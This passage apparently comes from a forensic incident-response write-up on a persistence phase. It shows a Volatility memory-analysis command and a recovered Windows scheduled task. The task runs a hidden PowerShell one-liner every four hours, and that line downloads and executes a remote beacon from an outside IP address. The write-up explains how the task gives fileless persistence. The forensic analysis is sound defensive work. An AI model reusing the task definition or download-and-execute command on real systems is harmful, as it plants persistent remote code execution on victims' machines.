### Phase 3 — Persistence: Scheduled Task Recovery

```bash
python vol.py -f WS-FIN-047.mem windows.handles --pid 4904 --object-type File
```

Scheduled task XML recovered from KAPE artefacts:

```xml
<Task>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2024-03-11T09:10:00</StartBoundary>
      <Repetition><Interval>PT4H</Interval></Repetition>
    </CalendarTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoP -NonI -W Hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://94.102.49.190/update')"</Arguments>
    </Exec>
  </Actions>
</Task>
```

> The scheduled task ran every 4 hours, re-downloading and re-injecting the beacon in case it was terminated — providing resilient persistence without leaving a persistent file on disk.

